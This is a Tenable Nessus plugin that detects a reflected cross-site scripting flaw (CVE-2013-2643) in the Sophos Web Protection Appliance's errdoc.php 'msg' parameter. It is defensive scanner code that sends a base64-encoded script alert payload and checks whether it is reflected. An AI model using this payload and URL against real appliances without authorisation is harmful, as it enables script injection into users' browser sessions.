#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66024);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/12/09 21:14:10 $");

  script_cve_id("CVE-2013-2643");
  script_bugtraq_id(58834);
  script_osvdb_id(91956);
  script_xref(name:"EDB-ID", value:"24932");

  script_name(english:"Sophos Web Protection Appliance end-user-/errdoc.php 'msg' Parameter XSS");
  script_summary(english:"Attempts to exploit a cross-site scripting vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Sophos Web Protection application running on the remote host is
affected by a cross-site scripting (XSS) vulnerability in the
/end-user-/errdoc.php script due to improper sanitization of
user-supplied input passed to the 'msg' parameter. An unauthenticated,
remote attacker can exploit this, via a specially crafted request, to
execute arbitrary script code in a user's browser session.

Note that the application is reportedly affected by additional
vulnerabilities; however, this plugin has not tested for them.");
  # https://web.archive.org/web/20140801055954/http://www.sophos.com/en-us/support/knowledgebase/118969.aspx
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?73c4a257");
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4aac7176");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Sophos Web Protection Appliance version 3.7.8.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/04/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/04/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sophos:web_appliance");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:sophos:sophos_web_protection");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("sophos_web_protection_detect.nasl");
  script_require_keys("installed_sw/sophos_web_protection");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

appname = 'Sophos Web Protection';

get_install_count(app_name:'sophos_web_protection', exit_if_zero:TRUE);
port = get_http_port(default:443);
install = get_single_install(app_name:'sophos_web_protection', port:port);

exploit = '<script>alert(\'sophos_web_protection_xss.nasl-' + unixtime() + '\');</script>';
url = dir + 'end-user/errdoc.php?e=530&msg='+urlencode(str:base64(str:exploit));

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  '<p id="remote_message">'+exploit >< res[2] &&
  'Sophos Web Appliance: FTP Server Authentication Failed</title>' >< res[2]
)
{
  set_kb_item(name:"www/"+port+"/XSS", value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to exploit the issue using the following URL :' +
      '\n\n' +
      build_url(port:port, qs:url);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, 'The Sophos Web Protection install at '+build_url(qs:install['dir'], port:port)+' is not affected.');
